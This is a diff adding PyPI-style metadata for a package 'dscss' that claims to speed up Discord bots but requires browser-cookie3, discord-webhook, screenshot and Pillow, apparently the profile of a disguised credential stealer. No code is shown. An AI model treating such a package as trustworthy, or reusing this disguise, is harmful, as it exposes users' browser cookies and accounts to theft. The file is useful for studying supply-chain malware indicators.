@@ -1,0 +1,15 @@
+Metadata-Version: 2.1
+Name: dscss
+Version: 1.0.1
+Summary: Discord Bot SuperSpeed for DiscordPy
+Home-page: https://anycorp.dev
+Author: SDev
+Classifier: Programming Language :: Python :: 3
+Classifier: Operating System :: OS Independent
+Requires-Python: >=3.6
+Requires-Dist: requests
+Requires-Dist: discord-webhook
+Requires-Dist: browser-cookie3
+Requires-Dist: screenshot
+Requires-Dist: Pillow
+
